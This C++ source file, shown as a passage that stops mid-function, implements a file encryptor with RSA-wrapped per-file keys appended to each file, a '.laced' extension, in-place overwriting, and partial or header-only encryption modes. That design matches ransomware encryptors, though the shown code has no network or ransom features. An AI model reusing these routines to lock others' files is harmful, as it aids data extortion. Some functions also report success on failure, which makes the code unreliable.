
#ifdef _WIN32
#include <windows.h>
#include <bcrypt.h>
#include <fileapi.h>
#pragma comment(lib, "bcrypt.lib")
#endif


#include <thread>
#include <stdio.h>
#include <string>
#include <map>

#include "filesystem.h"
#include "memory.h"
#include "logs.h"
#include "sha/sha256.h"
#include "aes/aes256.h"
#include "rsa/rsa.h"
#include "base64/base64.h"
#include "global_parameters.h"
#include "CommandParser.h"

#ifdef __linux__

#include <openssl/evp.h>
#include <openssl/pem.h>

constexpr int MAX_PATH = 255;

#endif

constexpr unsigned MB = 1048576;

#define ECRYPT_WNAME_P T(".laced")
#define ECRYPT_NAME_P ".laced"
#define ECRYPT_NAME_LEN 6
#define ECRYPT_VERSION "1.0"
#define ECRYPT_VERSION_LEN 3
#define ECRYPT_NAME_STORAGE "LACEDSTORAGE"
#define ECRYPT_LEN_STORAGE 12
#define PSIZE_BLOCK 256
#define HPSIZE_BLOCK PSIZE_BLOCK/2

#define SET(v,w) ((v) = (w))

std::mutex g_MutexBcrypt;

bool filesystem::WriteFullData
(
	DESC hFile,
	LPVOID Buffer,
	unsigned Size
)
{
	DWORD TotalWritten = 0;
#ifdef _WIN32
	DWORD BytesWritten = 0;
#else
	int BytesWritten = 0;
#endif
	DWORD BytesToWrite = Size;
	DWORD Offset = 0;

	while (TotalWritten != Size)
	{
		if (!api::WriteFile(hFile, (BYTE*)Buffer + Offset, BytesToWrite, &BytesWritten) || !BytesWritten)
		{
			return FALSE;
		}

		Offset += BytesWritten;
		TotalWritten += BytesWritten;
		BytesToWrite -= BytesWritten;
	}

	return TRUE;
}


static bool EncryptFileFullData(PFILE_INFO FileInfo)
{
	BOOL success = FALSE;
	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
#ifdef _WIN32
	DWORD written = 0;
#else
	int written = 0;
#endif
	DWORD BytesRead = FileInfo->filesize;
	size_t dwread = 0;
	DWORD padding = 0;
	bool isAes = FileInfo->crypt_info->method_policy == CryptoPolicy::AES256
		|| FileInfo->crypt_info->method_policy == CryptoPolicy::RSA_AES256;
	if (isAes && FileInfo->dcrypt == (int)EncryptCipher::CRYPT)
		padding = aes256_padding(BytesRead) - BytesRead;
		

	BYTE* FileBuffer = (BYTE*)memory::m_malloc(BytesRead + AES_BLOCK_SIZE);
	if (!FileBuffer)
	{
		LOG_ERROR("[EncryptFileFullData] Large File Size. Buffer heap crash; %s", FileInfo->filename);
		goto end;
	}

	if (!api::ReadFile(FileInfo->filehandle, FileBuffer, BytesRead, &dwread))
	{
		LOG_ERROR("[EncryptFileFullData] File is failed to ReadFile; %s", FileInfo->filename);
		goto end;
	}

	FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, FileBuffer, FileBuffer, dwread);

	if(isAes && FileInfo->dcrypt == (int)EncryptCipher::DECRYPT)
	{
		memory::memzero_explicit(&FileBuffer[FileInfo->filesize - FileInfo->padding], FileInfo->padding);
		FileInfo->filesize -= FileInfo->padding;
		BytesRead -= FileInfo->padding;
	}

	if(GLOBAL_STATE.g_write_in &&
		(!api::SetPointOff(FileInfo->recent_filehandle, 0, SEEK_SET) &&
		!api::WriteFile(FileInfo->recent_filehandle, FileBuffer, BytesRead + padding, &written)))
	{
		LOG_ERROR("[EncryptFileFullData] failed;");
		goto end;
	}
	else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, FileBuffer, BytesRead + padding))
	{
		LOG_ERROR("[EncryptFileFullData] File is failed to write; %s", FileInfo->filename);
		goto end;
	}

	if(sleep_time > 0)
		std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));

	success = TRUE;
end:
	if (FileBuffer) memory::m_free(FileBuffer);
	return TRUE;
}


static bool EncryptFilePartly
(
	PFILE_INFO FileInfo,
	BYTE DataPercent
)
{
	BOOL success = FALSE;
	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
#ifdef _WIN32
	DWORD written = 0;
#else
	int written = 0;
#endif
	size_t total_write = 0;
	DWORD multiply = 0;
	size_t BytesRead;
	size_t BytesReadW;
	LONGLONG TotalRead;
	LONGLONG PartSize = 0;
	LONGLONG StepSize = 0;
	int StepsCount = 0;
	LONGLONG Size = FileInfo->filesize;

	switch (DataPercent)
	{
	case 20:
		PartSize = (Size / 100) * 7;
		StepsCount = 3;
		StepSize = (Size - (PartSize * 3)) / 2;
		break;

	case 50:
		PartSize = (Size / 100) * 10;
		StepsCount = 5;
		StepSize = PartSize;
		break;

	default:
		return FALSE;
	}

	BOOL isAes = FileInfo->crypt_info->method_policy == CryptoPolicy::AES256
		|| FileInfo->crypt_info->method_policy == CryptoPolicy::RSA_AES256;
	if (isAes)
	{
		if (PartSize < AES_BLOCK_SIZE)
		{
			LOG_ERROR("[EncryptFilePartly] Failed - small size file, size must be >= 300 byte. Filename: " log_str, FileInfo->filename);
			return FALSE;
		}
		multiply = PartSize % 16;
	}


	BYTE* BufferPart = (BYTE*)memory::m_malloc(PartSize);
	BYTE* BufferStep = (BYTE*)memory::m_malloc(StepSize);
	if (!BufferPart || !BufferStep)
	{
		LOG_ERROR("[EncryptFilePartly] Large File Size. Buffer heap crash; " log_str, FileInfo->filename);
		return FALSE;
	}

	for (int i = 0; i < StepsCount; ++i)
	{
		if (!api::ReadFile(FileInfo->filehandle, BufferPart, PartSize, &BytesRead) || !BytesRead)
		{
			LOG_ERROR("[EncryptFilePartly] Failed File to Read Data; " log_str, FileInfo->file_path);
			goto end;
		}

		FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, BufferPart, BufferPart, BytesRead - multiply);

		if(GLOBAL_STATE.g_write_in)
		{
			if(!api::SetPointOff(FileInfo->recent_filehandle, total_write, SEEK_SET) || 
				!api::WriteFile(FileInfo->recent_filehandle, BufferPart, BytesRead, &written))
				{
					LOG_ERROR("[EncryptFilePartly] failed;");
					goto end;
				}
			total_write += BytesRead;
		}
		else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, BufferPart, BytesRead))
		{
			LOG_ERROR("[EncryptFilePartly] Failed File to Write data; " log_str, FileInfo->file_path);
			goto end;
		}
		TotalRead = 0;
		while (TotalRead < StepSize)
		{
			if (!api::ReadFile(FileInfo->filehandle, BufferStep, StepSize, &BytesReadW) || !BytesReadW)
				break;
			if(GLOBAL_STATE.g_write_in)
			{
				if(!api::SetPointOff(FileInfo->recent_filehandle, total_write, SEEK_SET) || 
				!api::WriteFile(FileInfo->recent_filehandle, BufferStep, BytesReadW, &written))
					break;		
			}
			else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, BufferStep, BytesReadW))
				break;
			TotalRead += BytesReadW;
			total_write += BytesReadW;

			if(sleep_time > 0)
				std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));
		}
	}

	success = TRUE;

end:
	if (BufferPart)
		memory::m_free(BufferPart);
	if (BufferStep)
		memory::m_free(BufferStep);

	return success;
}

static bool EncryptFileBlock
(
	PFILE_INFO FileInfo
)
{
	BOOL success = FALSE;
	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
	size_t BytesRead;
	size_t total_write = 0;
#ifdef _WIN32
	DWORD written = 0;
#else
	int written = 0;
#endif
	u32 padding = 0;
	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576 + AES_BLOCK_SIZE);

	while (api::ReadFile(FileInfo->filehandle, Buffer, 1048576, &BytesRead) && BytesRead != 0)
	{
		if (BytesRead < 1048576 && FileInfo->crypt_info->method_policy == CryptoPolicy::AES256)
		{
			padding = BytesRead % 16;
			BytesRead -= padding;
		}

		FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, Buffer, Buffer, BytesRead);

		if(GLOBAL_STATE.g_write_in)
		{
			if(!api::SetPointOff(FileInfo->recent_filehandle, total_write, SEEK_SET) || 
				!api::WriteFile(FileInfo->recent_filehandle, Buffer, BytesRead, &written))
				{
					LOG_ERROR("[EncryptFileBlock] failed;");
					goto end;
				}
			total_write += written;
		}
		else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, BytesRead + padding))
		{
			LOG_ERROR("[EncryptFileBlock] [WriteFullData] Failed");
			goto end;
		}

		if(sleep_time > 0)
			std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));
	}

	success = TRUE;
end:
	memory::m_free(Buffer);
	return TRUE;
}

static bool EncryptFileHeader
(
	PFILE_INFO FileInfo
)
{
	if (FileInfo->filesize < 1048576)
	{
		LOG_ERROR("[EncryptFileHeader] FileSize must be > 1.0 MB; " log_str, FileInfo->filename);
		return FALSE;
	}

	BOOL success = FALSE;
	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
	DWORD BytesEncrypt = 1048576;
	size_t BytesRead;
	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576);
	if (!Buffer)
	{
		LOG_ERROR("Heap Crash");
		return FALSE;
	}
	if (!api::ReadFile(FileInfo->filehandle, Buffer, BytesEncrypt, &BytesRead) || BytesRead != BytesEncrypt)
	{
		LOG_ERROR("[EncryptFileHeader] Failed ReadFile; " log_str, FileInfo->filename);
		goto end;
	}

	FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, 0, Buffer, Buffer, BytesEncrypt);
	
	if(GLOBAL_STATE.g_write_in)
	{
#ifdef _WIN32
		DWORD written = 0;
#else
		int written = 0;
#endif
		if(!api::SetPoint(FileInfo->recent_filehandle, SEEK_SET) || 
			!api::WriteFile(FileInfo->recent_filehandle, Buffer, BytesEncrypt, &written))
			{
				LOG_ERROR("[EncryptFileHeader] failed;");
				goto end;
			}
	}
	else
	{
		if (!filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, BytesEncrypt))
		{
			LOG_ERROR("[EncryptFileH	eader] [WriteFullData] failed");
			goto end;
		}

		while (api::ReadFile(FileInfo->filehandle, Buffer, BytesEncrypt, &BytesRead) && BytesRead != 0)
		{
			if (!filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, BytesRead))
			{
				LOG_ERROR("[EncryptFileHeader] [WriteFullData] failed");
				goto end;
			}

			if(sleep_time > 0)
				std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));

		}
	}

	success = TRUE;

end:
	memory::m_free(Buffer);
	return success;
}

bool filesystem::OptionEncryptModeAUTO(PFILE_INFO FileInfo)
{
	if (FileInfo->filesize <= 1048576)
	{
		if (!EncryptFileFullData(FileInfo))
		{
			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileFullData]; " log_str, FileInfo->filename);
			return FALSE;
		}
	}
	else if (FileInfo->filesize <= 5242880)
	{
		if (!EncryptFilePartly(FileInfo, 20))
		{
			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFilePartly]; " log_str, FileInfo->filename);
			return FALSE;
		}
	}
	else
	{
		if (!EncryptFileHeader(FileInfo))
		{
			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileHeader]; " log_str, FileInfo->filename);
			return FALSE;
		}
	}

	return TRUE;
}

bool filesystem::OptionEncryptModeFULL(PFILE_INFO FileInfo)
{
	if (!EncryptFileFullData(FileInfo))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileFullData]; " log_str, FileInfo->filename);
		return FALSE;
	}

	return TRUE;
}

bool filesystem::OptionEncryptModePARTLY(PFILE_INFO FileInfo)
{
	if (!EncryptFilePartly(FileInfo, 20))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFilePartly]; " log_str, FileInfo->filename);
		return FALSE;
	}

	return TRUE;
}

bool filesystem::OptionEncryptModeHEADER(PFILE_INFO FileInfo)
{
	if (!EncryptFileHeader(FileInfo))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileHeader]; " log_str, FileInfo->filename);
		return FALSE;
	}

	return TRUE;
}

bool filesystem::OptionEncryptModeBLOCK(PFILE_INFO FileInfo)
{
	if (!EncryptFileBlock(FileInfo))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileBlock]; " log_str, FileInfo->filename);
		return FALSE;
	}

	return TRUE;
}

bool filesystem::ReadRSAFile
(
	CRYPT_INFO* CryptInfo
)
{
	BOOL success = FALSE;
	DESC hCryptFile = INVALID_HANDLE_VALUE;
	size_t dwread;
#ifdef _WIN32
	NTSTATUS status;
#endif
	DWORD resByte = 0;

	size_t filesize;
	if (!api::get_parse_file(CryptInfo->desc.rsa_path, &hCryptFile, &filesize))
	{
		LOG_ERROR("[ReadRSAFile] Failed Open key file; " log_str, CryptInfo->desc.rsa_path);
		return FALSE;
	}

	CryptInfo->desc.size = filesize;
	if (!api::ReadFile(hCryptFile, CryptInfo->desc.key_data, CryptInfo->desc.size, &dwread) || dwread != filesize)
	{
		LOG_ERROR("[ReadRSAFile] Failed Key ReadFile; " log_str, CryptInfo->desc.rsa_path);
		return FALSE;
	}

#ifdef _WIN32
	if (!HandleError(
		BCryptOpenAlgorithmProvider(&CryptInfo->desc.crypto_provider, BCRYPT_RSA_ALGORITHM, NULL, 0)
	))
	{
		LOG_ERROR("[BCryptOpenAlgorithmProvider] Failed");
		return FALSE;
	}

	CONST WCHAR* bcrpyt_blob = GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT ? BCRYPT_RSAPUBLIC_BLOB : BCRYPT_RSAPRIVATE_BLOB;

	if (GLOBAL_STATE.g_RsaBase64)
	{
		int bsize;
		char* buffer = (char*)memory::m_malloc(4096);
		void* ptr = CryptInfo->desc.key_data;
		if (!base64::base64(BASE_E::DECODE, CryptInfo->desc.key_data, CryptInfo->desc.size, buffer, &bsize))
			goto END;
		memory::m_free(ptr);
		CryptInfo->desc.key_data = (BYTE*)buffer;
		CryptInfo->desc.size = bsize;

		if (!HandleError
		(
			BCryptImportKeyPair(CryptInfo->desc.crypto_provider,
				NULL, bcrpyt_blob,
				&CryptInfo->desc.handle_rsa_key, CryptInfo->desc.key_data,
				bsize, 0))
			)
		{
			LOG_ERROR("[ReadRSAFile] [BCryptImportKeyPair] Failed");
			goto END;
		}
	}
	else
	{
		if (!HandleError
		(
			BCryptImportKeyPair
			(
				CryptInfo->desc.crypto_provider,
				NULL, bcrpyt_blob,
				&CryptInfo->desc.handle_rsa_key, CryptInfo->desc.key_data,
				CryptInfo->desc.size, 0
			)
		))
		{
			LOG_ERROR("[ReadRSAFile] [BCryptImportKeyPair] Failed");
			LOG_INFO("[ReadRSAFile] if key in format Base64 - check flag -B64");
			goto END;
		}
	}

	status = BCryptGetProperty
	(
		CryptInfo->desc.handle_rsa_key,
		BCRYPT_KEY_LENGTH,
		(PUCHAR)&CryptInfo->desc.size,
		sizeof(CryptInfo->desc.size),
		&resByte,
		0
	);
	if (!HandleError(status) || resByte != 4)
	{
		LOG_ERROR("[ReadRSAFile] Failed Get size");
		goto END;
	}
	if ((CryptInfo->desc.size /= 8) % 8 != 0)
	{
		LOG_ERROR("[ReadRSAFile] Invalid Size");
		goto END;
	}
#else

	if (GLOBAL_STATE.g_RsaBase64)
	{
		int bsize;
		char* buffer = (char*)memory::m_malloc(4096);
		void* ptr = CryptInfo->desc.key_data;
		if (!base64::base64(BASE_E::DECODE, CryptInfo->desc.key_data, CryptInfo->desc.size, buffer, &bsize))
			goto END;
		memory::m_free(ptr);
		CryptInfo->desc.key_data = (BYTE*)buffer;
		CryptInfo->desc.size = bsize;
	}
	
	if (!(CryptInfo->desc.bio = BIO_new_mem_buf(CryptInfo->desc.key_data, CryptInfo->desc.size)))
	{
		LOG_ERROR("[ReadRSAFile] Failed create BIO");
		err();
		goto END;
	}

	if (GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT &&
		!(CryptInfo->desc.PKEY = d2i_PUBKEY_bio(CryptInfo->desc.bio, NULL)))
	{
		LOG_ERROR("[ReadRSAFile] Failed load DER key");
		err();
		goto END;
	}
	else if (GLOBAL_ENUM.g_DeCrypt == EncryptCipher::DECRYPT &&
		!(CryptInfo->desc.PKEY = d2i_PrivateKey_bio(CryptInfo->desc.bio, NULL)))
	{
		LOG_ERROR("[ReadRSAFile] Failed load DER key");
		err();
		goto END;
	}

#endif



	success = TRUE;
END:
	if (hCryptFile != INVALID_HANDLE_VALUE)
		api::CloseDesc(hCryptFile);
	return success;
}


/*	ONLY RSA & ONLY (RSA_BYTE - 11) => FILESIZE	*/
bool filesystem::EncryptRSA
(
	PFILE_INFO FileInfo
)
{
	bool success = false;
	bool g_decrypt = FileInfo->dcrypt == (int)EncryptCipher::DECRYPT ? true : false;
	bool g_crypt = FileInfo->dcrypt == (int)EncryptCipher::CRYPT ? true : false;
	if (g_crypt && FileInfo->filesize > FileInfo->crypt_info->desc.size - 11)
	{
		LOG_ERROR("[EncryptRSA] Invalid Size File >= RSA_BYTE - PADDING(11); " log_str, FileInfo->filename);
		return false;
	}
	else if (g_decrypt && FileInfo->filesize > FileInfo->crypt_info->desc.size)
	{
		LOG_ERROR("[EncryptRSA] Invalid Size File < RSA_BYTE; " log_str, FileInfo->filename);
		return false;
	}

	size_t size = 0;
	DWORD dwDataLen = 0;
	BYTE* FileBuffer = NULL;
	FileBuffer = (BYTE*)memory::m_malloc(FileInfo->crypt_info->desc.size);
	BYTE* Buffer = NULL;
	if (!api::ReadFile(FileInfo->filehandle, FileBuffer, FileInfo->filesize, &size) || FileInfo->filesize != size)
	{
		LOG_ERROR("[EncryptRSA] Failed File ReadFile; " log_str, FileInfo->filename);
		goto END;
	}

#ifdef _WIN32
	if (g_crypt)
	{
		if (!HandleError
		(
			BCryptEncrypt
			(
				FileInfo->crypt_info->desc.handle_rsa_key,
				FileBuffer, FileInfo->filesize,
				NULL, NULL, 0,
				FileBuffer, FileInfo->crypt_info->desc.size, &dwDataLen, BCRYPT_PAD_PKCS1))
			)
		{
			LOG_ERROR("[CryptEncrypt] Failed; %ls", FileInfo->filename);
			goto END;
		}
	}
	else if (g_decrypt)
	{
		if (!HandleError
		(
			BCryptDecrypt
			(
				FileInfo->crypt_info->desc.handle_rsa_key,
				FileBuffer, FileInfo->crypt_info->desc.size,
				NULL, NULL, 0,
				FileBuffer, FileInfo->crypt_info->desc.size, &dwDataLen,
				BCRYPT_PAD_PKCS1))
			)
		{
			LOG_ERROR("[BCryptDecrypt] Failed");
			goto END;
		}
	}
	if (!WriteFullData(FileInfo->recent_filehandle, FileBuffer, dwDataLen))
	{
		LOG_ERROR("[WriteFullData] Failed to write");
		goto END;
	}
#else
	if (g_crypt && !rsa::EncryptRSA
	(
		FileInfo->crypt_info->desc.bio,
		FileInfo->crypt_info->desc.PKEY,
		FileInfo->crypt_info->desc.ctx,
		FileBuffer,
		&size,
		&Buffer
	))
	{
		LOG_ERROR("[EncryptRSA] Encrypt failed");
		err();
		goto END;
	}
	else if (g_decrypt && !rsa::DecryptRSA
	(
		FileInfo->crypt_info->desc.bio,
		FileInfo->crypt_info->desc.PKEY,
		FileInfo->crypt_info->desc.ctx,
		FileBuffer,
		&size,
		&Buffer
	))
	{
		LOG_ERROR("[EncryptRSA] Decrypt failed");
		err();
		goto END;
	}
	if (!WriteFullData(FileInfo->recent_filehandle, Buffer, size))
	{
		LOG_ERROR("[WriteFullData] Failed to write");
		goto END;
	}
#endif


	success = TRUE;

END:
#ifdef __linux__
	if (FileInfo->crypt_info->desc.ctx)
		EVP_PKEY_CTX_free(FileInfo->crypt_info->desc.ctx);
	if (Buffer)
		memory::m_free(Buffer);
#endif
	if (FileBuffer)
	{
		memory::memzero_explicit(FileBuffer, dwDataLen);
		memory::m_free(FileBuffer);
	}

	return success;
}




static bool GenKey
(
	PFILE_INFO FileInfo,
	BYTE* CryptKey,
	BYTE* CryptIV,
	BYTE* EncryptedKey,
	unsigned* sz
)
{
	DWORD writeData = 0;
#ifdef _WIN32
	if (!HandleError
	(BCryptGenRandom(0, CryptKey, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
	{
		LOG_ERROR("[BCryptGenRandom] Failed");
		return FALSE;
	}

	if (!HandleError
	(BCryptGenRandom(0, CryptIV, 8, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
	{
		LOG_ERROR("[BCryptGenRandom] Failed");
		return FALSE;
	}
#else
	if (!RAND_bytes(CryptKey, 32) || !RAND_bytes(CryptIV, 8))
	{
		LOG_ERROR("[RAND_bytes] Failed");
		err();
		return false;
	}
#endif

	FileInfo->crypt_info->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);

	memory::Copy(EncryptedKey, CryptKey, 32);
	memory::Copy(EncryptedKey + 32, CryptIV, 8);

#ifdef _WIN32
	if (!HandleError
	(
		BCryptEncrypt
		(
			FileInfo->crypt_info->desc.handle_rsa_key,
			EncryptedKey, 40,
			NULL, NULL, 0,
			EncryptedKey, FileInfo->crypt_info->desc.size, &writeData, BCRYPT_PAD_PKCS1))
		)
	{
		LOG_ERROR("[BCryptEncrypt] Failed");
		return FALSE;
	}
	*sz = writeData;
#else
	unsigned ksize = 40;
	BYTE* crypted = NULL;
	if (!rsa::EncryptRSA
	(
		FileInfo->crypt_info->desc.bio,
		FileInfo->crypt_info->desc.PKEY,
		FileInfo->crypt_info->desc.ctx,
		EncryptedKey,
		&ksize,
		&crypted
	))
	{
		LOG_ERROR("[EncryptRSA] Encrypt failed");
		return false;
	}

	if (crypted)
	{
		memory::memzero_explicit(EncryptedKey, 40);
		memcpy(EncryptedKey, crypted, ksize);
		memory::m_free(crypted);
		*sz = ksize;
	}
#endif

	return TRUE;
}


static bool WriteEncryptInfo
(
	PFILE_INFO FileInfo,
	BYTE* EncryptedKey,
	unsigned EKsize,
	EncryptModes EncryptMode
)
{

	BYTE Buffer[4] = { 0 };
	Buffer[0] = static_cast<int>(EncryptMode) + 100;
	std::string strbit = std::to_string(EKsize);
	memcpy(&Buffer[1], strbit.c_str(), 3);

#ifdef _WIN32
	LARGE_INTEGER Offset;
	Offset.QuadPart = 0;
	if (!SetFilePointerEx(FileInfo->recent_filehandle, Offset, NULL, FILE_END)
		|| !filesystem::WriteFullData(FileInfo->recent_filehandle, EncryptedKey, FileInfo->crypt_info->desc.size)
		|| !filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, 4))
	{
		LOG_ERROR("[WriteEncryptInfo] Failed to write info; %ls; GetLastError = %lu", FileInfo->filename, GetLastError());
		return FALSE;
	}

#else
	int Offset = 0;
	if (!api::SetPointOff(FileInfo->recent_filehandle, Offset, SEEK_END)
		|| !filesystem::WriteFullData(FileInfo->recent_filehandle, EncryptedKey, EKsize)
		|| !filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, 4))
	{
		LOG_ERROR("[WriteEncryptInfo] Failed to set point");
		return false;
	}
#endif

	return TRUE;
}

bool filesystem::FileCryptEncrypt
(
	PFILE_INFO FileInfo
)
{
	BOOL success = FALSE;
	EncryptModes mode = GLOBAL_ENUM.g_EncryptMode;
	BYTE* EncryptedKey = (BYTE*)memory::m_malloc(FileInfo->crypt_info->desc.size);
	BYTE CryptIV[8];
	BYTE CryptKey[32];
	unsigned ksize;

	if (!GenKey(FileInfo, CryptKey, CryptIV, EncryptedKey, &ksize))
	{
		LOG_ERROR("[GenKey] Failed to generate key;");
		goto END;
	}

	if (!FileInfo->crypt_info->mode_method(FileInfo))
		goto END;

	WriteEncryptInfo(FileInfo, EncryptedKey, ksize, mode);

	success = TRUE;
END:
	if (EncryptedKey)
	{
		memory::memzero_explicit(EncryptedKey, FileInfo->crypt_info->desc.size);
		memory::memzero_explicit(CryptIV, 8);
		memory::memzero_explicit(CryptKey, 32);
		memory::m_free(EncryptedKey);
	}

	return success;
}



static BYTE* ReadEncryptInfo
(
	DESC handle,
	DWORD* Bit
)
{
	BYTE ReadInfo[4];

#ifdef _WIN32
	LARGE_INTEGER Offset;
	Offset.QuadPart = -4;

	if (!SetFilePointerEx(handle, Offset, NULL, FILE_END)
		|| !ReadFile(handle, ReadInfo, 4, NULL, NULL))
	{
		LOG_ERROR("[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
		return NULL;
	}
#else
	unsigned read;
	if (!api::SetPointOff(handle, -4, SEEK_END)
		|| !api::ReadFile(handle, ReadInfo, 4, &read))
	{
		LOG_ERROR("[ReadEncryptInfo] Failed to read file info");
		return NULL;
	}
#endif

	int mode = ReadInfo[0] - 100;
	int size_bit = 0;
	for (int i = 1; i < 4; ++i)
	{
		if(ReadInfo[i] >= '0' && ReadInfo[i] <= '9')
			size_bit = size_bit * 10 + (ReadInfo[i] - '0');
		else
		{
			LOG_ERROR("[ReadEncryptInfo] Failed to read file info");
			return NULL;
		}
	}
	BYTE* read_key = (BYTE*)memory::m_malloc(size_bit);
#ifdef _WIN32
	Offset.QuadPart = -(size_bit + 4);
	if (!SetFilePointerEx(handle, Offset, NULL, FILE_END)
		|| !ReadFile(handle, read_key, size_bit, NULL, NULL))
	{
		LOG_ERROR("[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
		return NULL;
	}
	Offset.QuadPart = 0;
	if (!SetFilePointerEx(handle, Offset, NULL, FILE_BEGIN))
		return NULL;
#else
	if (!api::SetPointOff(handle, -(size_bit + 4), SEEK_END)
		|| !api::ReadFile(handle, read_key, size_bit, &read)
		|| !api::SetPoint(handle, SEEK_SET))
	{
		LOG_ERROR("[ReadEncryptInfo] Failed to read file info");
		return NULL;
	}
#endif

	* Bit = size_bit;
	return read_key;
}


bool filesystem::FileCryptDecrypt
(
	PFILE_INFO FileInfo
)
{
	BOOL success = FALSE;
	DWORD EncryptedKeySize = 0;
	DWORD written;
	BYTE* Buffer = NULL;
	BYTE CryptIV[8];
	BYTE CryptKey[32];
	BYTE* EncryptedKey = ReadEncryptInfo(FileInfo->filehandle, &EncryptedKeySize);
	if (EncryptedKey == NULL)	goto END;
	FileInfo->filesize -= EncryptedKeySize + 4;
	
#ifdef _WIN32
	if (SetFilePointer(FileInfo->filehandle, FileInfo->filesize, NULL, FILE_BEGIN))
	{
		SetEndOfFile(FileInfo->filehandle);
		SetFilePointer(FileInfo->filehandle, 0, NULL, FILE_BEGIN);
	}

	if (!HandleError
	(
		BCryptDecrypt(FileInfo->crypt_info->desc.handle_rsa_key,
			EncryptedKey, FileInfo->crypt_info->desc.size,
			NULL, NULL, 0,
			EncryptedKey, 40, &written,
			BCRYPT_PAD_PKCS1))
		)
	{
		LOG_ERROR("[BCryptDecrypt] Failed");
		goto END;
	}
	memory::Copy(CryptKey, EncryptedKey, 32);
	memory::Copy(CryptIV, EncryptedKey + 32, 8);
#else
	if (ftruncate(FileInfo->filehandle, FileInfo->filesize) == -1)
	{
		LOG_ERROR("Failed truncate key");
		goto END;
	}

	if (!rsa::DecryptRSA
	(
		FileInfo->crypt_info->desc.bio,
		FileInfo->crypt_info->desc.PKEY,
		FileInfo->crypt_info->desc.ctx,
		EncryptedKey,
		&EncryptedKeySize,
		&Buffer
	))
	{
		LOG_ERROR("[FileCryptDecrypt] Decrypt failed");
		goto END;
	}
	memory::Copy(CryptKey, Buffer, 32);
	memory::Copy(CryptIV, Buffer + 32, 8);
#endif

	FileInfo->crypt_info->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);

	success = FileInfo->crypt_info->mode_method(FileInfo);

END:
	if (EncryptedKey)
	{
		memory::memzero_explicit(EncryptedKey, EncryptedKeySize);
		memory::memzero_explicit(CryptKey, 32);
		memory::memzero_explicit(CryptIV, 8);
		memory::m_free(EncryptedKey);
	}
#ifdef __linux__
	if (Buffer)
	{
		memory::memzero_explicit(Buffer, EncryptedKeySize);
		memory::m_free(Buffer);
	}
#endif

	return success;
}

static void memcpy_offset(void* pdst, const void* psrc, size_t size, size_t* offset)
{
	memcpy(pdst, psrc, size);
	*offset += size;
} 

PHEAD_BLOCK filesystem::fill_struct_hblock(DESC filehandle, size_t filesize, const char* crypt_name)
{
	size_t offset = 0;
	PHEAD_BLOCK hblock_t = (PHEAD_BLOCK)memory::m_malloc(sizeof(HEAD_BLOCK));
	*hblock_t = 
	{
		.ctx = (laced_ctx*)memory::m_malloc(sizeof(laced_ctx)),
		.pblock = (BYTE*)memory::m_malloc(PSIZE_BLOCK)
	};

	if(filesize >= PSIZE_BLOCK)
	{
		// DESC desc;
		// size_t fs = 0;
		// api::get_parse_file("", &desc, &fs);
		size_t bytes_read;
		api::ReadFile(filehandle, hblock_t->pblock, PSIZE_BLOCK, &bytes_read);
		if (!memory::memcmp(&hblock_t->pblock[offset], ECRYPT_NAME_STORAGE, ECRYPT_LEN_STORAGE))
		{
			LOG_ERROR("header block is not valid");
			return NULL;
		}
		offset += ECRYPT_LEN_STORAGE;
		if (!memory::memcmp(&hblock_t->pblock[offset], ECRYPT_VERSION, ECRYPT_VERSION_LEN))
		{
			LOG_ERROR("header block ecrypt version is not valid");
			return NULL;
		}
		offset += ECRYPT_VERSION_LEN;
	}
	else
	{
		memcpy_offset(&hblock_t->pblock[offset], ECRYPT_NAME_STORAGE, ECRYPT_LEN_STORAGE, &offset);
		memcpy_offset(&hblock_t->pblock[offset], ECRYPT_VERSION, ECRYPT_VERSION_LEN, &offset);
		memcpy_offset(&hblock_t->pblock[offset], crypt_name, memory::StrLen(crypt_name), &offset);

#ifdef _WIN32
		HandleError(BCryptGenRandom(0, &hblock_t->pblock[offset], PSIZE_BLOCK - offset, BCRYPT_USE_SYSTEM_PREFERRED_RNG));
#else
		RAND_bytes(&hblock_t->pblock[offset], PSIZE_BLOCK - offset);
#endif

	// HANDLE desc1 = NULL;
	// DWORD written = 0;
	// api::create_file_open(&desc1, "");
	// api::WriteFile(desc1, hblock_t->pblock, PSIZE_BLOCK, &written);
	}

	offset = HPSIZE_BLOCK;
	ECRYPT_keysetup((laced_ctx*)hblock_t->ctx, &hblock_t->pblock[offset], 256, 64);
	offset += 32;
